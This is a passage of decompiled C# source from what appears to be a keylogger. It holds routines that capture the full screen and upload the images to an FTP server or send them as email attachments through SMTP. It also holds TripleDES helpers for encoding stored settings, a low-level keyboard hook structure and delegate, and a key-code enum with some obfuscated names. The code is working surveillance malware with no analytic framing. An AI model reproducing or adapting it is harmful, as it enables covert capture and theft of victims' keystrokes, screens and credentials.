      MyProject.Computer.Network.UploadFile(str3, "ftp://" + qsCMHj + Dir + str2, bHQRPUFx, jyqbJLfI);
      if (Module1.TakeScrns)
      {
        using (Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
        {
          using (Graphics graphics = Graphics.FromImage((Image) bitmap))
          {
            graphics.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
            bitmap.Save(Path.GetTempPath() + str2 + ".gif", ImageFormat.Gif);
          }
        }
        MyProject.Computer.Network.UploadFile(Path.GetTempPath() + str2 + ".gif", "ftp://" + qsCMHj + Dir + str2 + ".gif", bHQRPUFx, jyqbJLfI);
        System.IO.File.Delete(Path.GetTempPath() + str2 + ".gif");
      }
      System.IO.File.Delete(str3);
      str1 = "FTP information is valid and working!";
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str1 = "FTP information is invalid: " + ex.Message;
      ProjectData.ClearProjectError();
    }
    return str1;
  }

  public static string UpFTPImg(
    ref string Host,
    ref string Dir,
    ref string Username,
    ref string Password)
  {
    string str1;
    try
    {
      string str2 = "\\" + Module1.LT;
      using (Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
      {
        using (Graphics graphics = Graphics.FromImage((Image) bitmap))
        {
          graphics.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
          bitmap.Save(Path.GetTempPath() + str2 + ".gif", ImageFormat.Gif);
        }
      }
      MyProject.Computer.Network.UploadFile(Path.GetTempPath() + str2 + ".gif", "ftp://" + Host + Dir + str2 + ".gif", Username, Password);
      System.IO.File.Delete(Path.GetTempPath() + str2 + ".gif");
      str1 = "FTP information is valid and working!";
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str1 = "FTP information is invalid: " + ex.Message;
      ProjectData.ClearProjectError();
    }
    return str1;
  }

  public static string SendEmail(
    ref string SMTP,
    ref string Froma,
    ref string Password,
    ref string Recipient,
    ref string Subject,
    ref string Body,
    ref int Port,
    ref bool TakePic = false)
  {
    string str1;
    try
    {
      MailMessage message = new MailMessage();
      message.From = new MailAddress(Froma);
      message.To.Add(Recipient);
      message.Subject = Subject;
      message.Body = Body;
      SmtpClient smtpClient = new SmtpClient(SMTP);
      string str2 = "\\" + Module1.LT;
      if (TakePic)
      {
        using (Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height))
        {
          using (Graphics graphics = Graphics.FromImage((Image) bitmap))
          {
            graphics.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size);
            bitmap.Save(Path.GetTempPath() + str2 + ".gif", ImageFormat.Gif);
          }
        }
        Attachment attachment = new Attachment(Path.GetTempPath() + str2 + ".gif");
        message.Attachments.Add(attachment);
      }
      smtpClient.Port = Port;
      smtpClient.EnableSsl = true;
      smtpClient.Credentials = (ICredentialsByHost) new NetworkCredential(Froma, Password);
      smtpClient.Send(message);
      if (Module1.TakeScrns)
        System.IO.File.Delete(Path.GetTempPath() + str2 + ".gif");
      str1 = "Email information is valid and working!";
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      str1 = "Email information invalid: " + ex.Message;
      ProjectData.ClearProjectError();
    }
    return str1;
  }

  private static string TripleDESEncode(string value, string key)
  {
    TripleDESCryptoServiceProvider cryptoServiceProvider = new TripleDESCryptoServiceProvider();
    cryptoServiceProvider.IV = new byte[8];
    PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(key, new byte[0]);
    cryptoServiceProvider.Key = passwordDeriveBytes.CryptDeriveKey("RC2", "MD5", 128, new byte[8]);
    MemoryStream memoryStream = new MemoryStream(checked (value.Length * 2 - 1));
    CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, cryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write);
    byte[] bytes = Encoding.UTF8.GetBytes(value);
    cryptoStream.Write(bytes, 0, bytes.Length);
    cryptoStream.FlushFinalBlock();
    byte[] numArray = new byte[checked ((int) (memoryStream.Length - 1L) + 1)];
    memoryStream.Position = 0L;
    memoryStream.Read(numArray, 0, checked ((int) memoryStream.Length));
    cryptoStream.Close();
    return Convert.ToBase64String(numArray);
  }

  public static string TripleDESDecode(string value, string key)
  {
    TripleDESCryptoServiceProvider cryptoServiceProvider = new TripleDESCryptoServiceProvider();
    cryptoServiceProvider.IV = new byte[8];
    PasswordDeriveBytes passwordDeriveBytes = new PasswordDeriveBytes(key, new byte[0]);
    cryptoServiceProvider.Key = passwordDeriveBytes.CryptDeriveKey("RC2", "MD5", 128, new byte[8]);
    byte[] buffer = Convert.FromBase64String(value);
    MemoryStream memoryStream = new MemoryStream(value.Length);
    CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream, cryptoServiceProvider.CreateDecryptor(), CryptoStreamMode.Write);
    cryptoStream.Write(buffer, 0, buffer.Length);
    cryptoStream.FlushFinalBlock();
    byte[] numArray = new byte[checked ((int) (memoryStream.Length - 1L) + 1)];
    memoryStream.Position = 0L;
    memoryStream.Read(numArray, 0, checked ((int) memoryStream.Length));
    cryptoStream.Close();
    return Encoding.UTF8.GetString(numArray);
  }

  public struct dlxatZ
  {
    public int vkCode;
    public int scanCode;
    public int flags;
    public int time;
    public int dwExtraInfo;
  }

  public enum zxfUoe
  {
    K_Backspace = 8,
    K_Tab = 9,
    K_Return = 13, // 0x0000000D
    K_Shift = 16, // 0x00000010
    K_Control = 17, // 0x00000011
    K_Alt = 18, // 0x00000012
    K_Pause = 19, // 0x00000013
    K_CapsLock = 20, // 0x00000014
    K_Esc = 27, // 0x0000001B
    K_Space = 32, // 0x00000020
    VSoLjb = 35, // 0x00000023
    HQoiMO = 36, // 0x00000024
    K_Left = 37, // 0x00000025
    K_Up = 38, // 0x00000026
    K_Right = 39, // 0x00000027
    K_Down = 40, // 0x00000028
    K_PrintScreen = 44, // 0x0000002C
    xHHGLh = 45, // 0x0000002D
    xkLhgJpIt = 46, // 0x0000002E
    K_0 = 48, // 0x00000030
    K_1 = 49, // 0x00000031
    K_2 = 50, // 0x00000032
    K_3 = 51, // 0x00000033
    K_4 = 52, // 0x00000034
    K_5 = 53, // 0x00000035
    K_6 = 54, // 0x00000036
    K_7 = 55, // 0x00000037
    K_8 = 56, // 0x00000038
    K_9 = 57, // 0x00000039
    K_A = 65, // 0x00000041
    K_B = 66, // 0x00000042
    K_C = 67, // 0x00000043
    K_D = 68, // 0x00000044
    K_E = 69, // 0x00000045
    K_F = 70, // 0x00000046
    K_G = 71, // 0x00000047
    K_H = 72, // 0x00000048
    K_I = 73, // 0x00000049
    K_J = 74, // 0x0000004A
    K_K = 75, // 0x0000004B
    K_L = 76, // 0x0000004C
    K_M = 77, // 0x0000004D
    K_N = 78, // 0x0000004E
    K_O = 79, // 0x0000004F
    K_P = 80, // 0x00000050
    K_Q = 81, // 0x00000051
    K_R = 82, // 0x00000052
    K_S = 83, // 0x00000053
    K_T = 84, // 0x00000054
    K_U = 85, // 0x00000055
    K_V = 86, // 0x00000056
    K_W = 87, // 0x00000057
    K_X = 88, // 0x00000058
    K_Y = 89, // 0x00000059
    K_Z = 90, // 0x0000005A
    K_LWin = 91, // 0x0000005B
    K_RWin = 92, // 0x0000005C
    K_Numpad0 = 96, // 0x00000060
    K_Numpad1 = 97, // 0x00000061
    K_Numpad2 = 98, // 0x00000062
    K_Numpad3 = 99, // 0x00000063
    K_Numpad4 = 100, // 0x00000064
    K_Numpad5 = 101, // 0x00000065
    K_Numpad6 = 102, // 0x00000066
    K_Numpad7 = 103, // 0x00000067
    K_Numpad8 = 104, // 0x00000068
    K_Numpad9 = 105, // 0x00000069
    K_Num_Multiply = 106, // 0x0000006A
    K_Num_Add = 107, // 0x0000006B
    K_Num_Subtract = 109, // 0x0000006D
    K_Num_Decimal = 110, // 0x0000006E
    K_Num_Divide = 111, // 0x0000006F
    K_F1 = 112, // 0x00000070
    K_F2 = 113, // 0x00000071
    K_F3 = 114, // 0x00000072
    K_F4 = 115, // 0x00000073
    K_F5 = 116, // 0x00000074
    K_F6 = 117, // 0x00000075
    K_F7 = 118, // 0x00000076
    K_F8 = 119, // 0x00000077
    K_F9 = 120, // 0x00000078
    K_F10 = 121, // 0x00000079
    K_F11 = 122, // 0x0000007A
    K_F12 = 123, // 0x0000007B
    K_F13 = 124, // 0x0000007C
    K_F14 = 125, // 0x0000007D
    K_F15 = 126, // 0x0000007E
    K_F16 = 127, // 0x0000007F
    K_F17 = 128, // 0x00000080
    K_F18 = 129, // 0x00000081
    K_F19 = 130, // 0x00000082
    K_F20 = 131, // 0x00000083
    K_F21 = 132, // 0x00000084
    K_F22 = 133, // 0x00000085
    K_F23 = 134, // 0x00000086
    K_F24 = 135, // 0x00000087
    K_NumLock = 144, // 0x00000090
    K_LShift = 160, // 0x000000A0
    K_RShift = 161, // 0x000000A1
    xbqJdwqgM = 162, // 0x000000A2
    BRUXPnDvf = 163, // 0x000000A3
    K_LAlt = 164, // 0x000000A4
    K_RAlt = 165, // 0x000000A5
    K_Subtract = 189, // 0x000000BD
    K_Decimal = 190, // 0x000000BE
  }

  private delegate int KeyboardHookDelegate(int Code, int wParam, ref Module1.dlxatZ lParam);
}
